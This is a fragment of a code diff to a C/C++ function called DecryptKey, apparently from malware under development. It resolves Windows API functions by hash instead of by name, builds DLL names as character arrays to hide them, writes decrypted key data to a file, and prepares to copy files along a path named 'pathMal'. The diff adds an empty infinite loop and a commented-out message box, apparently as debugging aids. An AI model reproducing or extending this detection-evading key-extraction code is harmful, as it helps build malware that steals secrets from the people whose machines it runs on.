@@ -452,7 +452,9 @@ void DecryptKey() {
     if (!pLoadLibraryA) {
         return;
     }
+    while (1) {
 
+    }
     char sOle32[] = {'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0'};
     HMODULE hOle32 = pLoadLibraryA(sOle32);
 
@@ -468,6 +470,12 @@ void DecryptKey() {
         DWORD  dwFlags,
         LPSTR  pszPath
         );
+
+    //typedef int (WINAPI* _MessageBoxA)(HWND, LPCSTR, LPCSTR, int);
+    //constexpr unsigned int hashMessageBoxA = ComplexHashForAnsi("MessageBoxA");
+    //_MessageBoxA pMessageBoxA = (_MessageBoxA)apiResolve.GetApiAddress(hUser32, hashMessageBoxA);
+    //pMessageBoxA(NULL, NULL, NULL, 0);
+
     constexpr unsigned int hashSHGetFolderPathA = ComplexHashForAnsi("SHGetFolderPathA");
     _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(hShell32, hashSHGetFolderPathA);
     if (!pSHGetFolderPathA) { return; }
@@ -717,7 +725,6 @@ void DecryptKey() {
         //CopyStringA(keyFileName, pathMal + StrLen(pathMal), MAX_PATH - StrLen(pathMal));
         HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
-
         constexpr unsigned int hashCopyFileA = ComplexHashForAnsi("CopyFileA");
         typedef BOOL (WINAPI* _CopyFileA)(
             LPCSTR lpExistingFileName,
